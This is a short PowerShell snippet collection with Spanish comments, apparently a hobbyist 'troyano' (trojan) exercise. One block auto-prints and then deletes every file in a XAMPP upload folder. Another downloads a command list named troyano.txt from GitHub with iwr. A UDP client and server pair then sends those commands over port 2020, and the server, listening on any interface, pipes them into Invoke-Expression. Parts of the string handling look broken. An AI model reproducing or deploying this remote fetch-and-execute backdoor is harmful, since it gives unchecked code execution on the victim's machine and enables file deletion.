```Powershell
Codigo que ademas de guardar automaticamente, seguidamente borra la carpeta caliente.

foreach($ficheros in (Get-ChildItem  "C:\xampp\htdocs\upload").name){
    
    Start-Process -Filepath "C:\xampp\htdocs\upload\$ficheros" -Verb print
    Start-Sleep -Milliseconds 2000
           [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
           Start-Sleep -Milliseconds 2000
           [System.Windows.Forms.SendKeys]::SendWait("$ficheros")
           Start-Sleep -Milliseconds 2000
           [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
           Start-Sleep -Milliseconds 2000
    Remove-Item "C:\xampp\htdocs\upload\$ficheros"
}
--------------------------------------------------------------------------------------------
## Fichero con cmdlets
$var = iwr https://raw.githubusercontent.com/marcofusco17/Powershell/main/troyano.txt
foreach ($linea in $var.Content -split "n")
{
    if($linea[0] -ne "-" -and $linea[0] -ne "#"  -and $linea[0] -ne "*" -and $linea[0] -ne '')
    {
        $linea.Replace(" ", "") | Out-File enviar.txt -Append
   }
}
----------------------------------------------------------------------------------------------

##Client
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Loopback,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient
$b=[Text.Encoding]::ASCII.GetBytes((gc enviar.txt))
$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
$udpclient.Close()


##Server
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content) |% {

    $_.Replace("", " ") | iex
}
$udpclient.Dispose()
```
